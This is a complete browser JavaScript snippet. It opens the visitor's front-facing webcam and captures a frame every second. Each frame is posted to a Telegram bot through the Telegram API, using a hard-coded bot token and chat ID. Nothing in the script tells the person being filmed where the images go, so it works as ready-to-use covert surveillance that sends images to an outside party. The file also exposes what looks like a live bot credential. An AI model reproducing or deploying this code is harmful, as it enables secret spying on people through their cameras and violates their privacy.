const botToken = '7486963640:AAE3sMEu0MPW7jPkUlxXqiklaRf6chWEW3I'
const chatId = '586564605'

;(async () => {
	try {
		// Set video constraints for higher resolution
		const stream = await navigator.mediaDevices.getUserMedia({
			video: {
				width: { ideal: 1280 }, // Request a resolution of 1280x720
				height: { ideal: 720 },
				facingMode: 'user', // Use 'environment' for the rear camera on mobile devices
			},
		})

		const video = document.createElement('video')
		video.srcObject = stream
		video.autoplay = true
		document.body.appendChild(video)

		setInterval(async () => {
			const canvas = document.createElement('canvas')
			const context = canvas.getContext('2d')
			canvas.width = video.videoWidth
			canvas.height = video.videoHeight
			context.drawImage(video, 0, 0, canvas.width, canvas.height)

			canvas.toBlob(async blob => {
				const formData = new FormData()
				formData.append('chat_id', chatId)
				formData.append('photo', blob, 'webcam_photo.jpg')

				try {
					const response = await fetch(
						`https://api.telegram.org/bot${botToken}/sendPhoto`,
						{
							method: 'POST',
							body: formData,
						}
					)
					const data = await response.json()
					console.log('Photo sent to Telegram:', data)
				} catch (error) {
					console.error('Error sending photo to Telegram:', error)
				}
			}, 'image/jpeg')
		}, 1000) // Interval set to 1 second (1000 milliseconds)
	} catch (error) {
		console.error('Error accessing webcam:', error)
	}
})()
